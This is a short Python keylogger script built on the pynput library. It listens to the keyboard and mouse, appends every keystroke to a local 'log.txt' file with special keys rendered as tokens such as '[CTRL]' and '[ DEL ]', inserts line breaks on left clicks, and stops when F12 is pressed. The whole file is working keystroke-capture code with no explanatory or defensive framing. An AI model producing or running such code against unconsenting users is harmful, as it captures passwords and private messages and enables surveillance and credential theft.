from pynput import keyboard, mouse

def on_click(x, y, button, pressed):
    button = str(button)
    if pressed:
        on_click.keyboard_active
        # Check if the keyboard is currently active
        if hasattr(on_click, 'keyboard_active') and on_click.keyboard_active:
            if button == "Button.left":
                print("")
                with open("log.txt", "a") as file:
                    file.write("\n")
    print(button)


def anonymous(key):
    on_click.keyboard_active = True
    key = str(key)
    key = key.replace("'", "")
    
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.enter" or key == 'Key.tab':
        key = "\n"
    if key == "Key.ctrl":
        key = "[CTRL]"
    if key == "Key.alt":
        key = "[ALT]"
    if key == "Key.space":
        key = " "
    if key == "Key.back":
        key = "[ DEL ]"
    if key == "Key.shift" or key == "Key.shift_l":
        key = ""
    print(key)

    with open("log.txt", "a") as file:
        file.write(key)


# Set the initial state of the keyboard
on_click.keyboard_active = False

# Keyboard listener
with keyboard.Listener(on_press=anonymous) as key_listener:
    # Mouse listener
    with mouse.Listener(on_click=on_click) as mouse_listener:
        # Keep the program running
        key_listener.join()
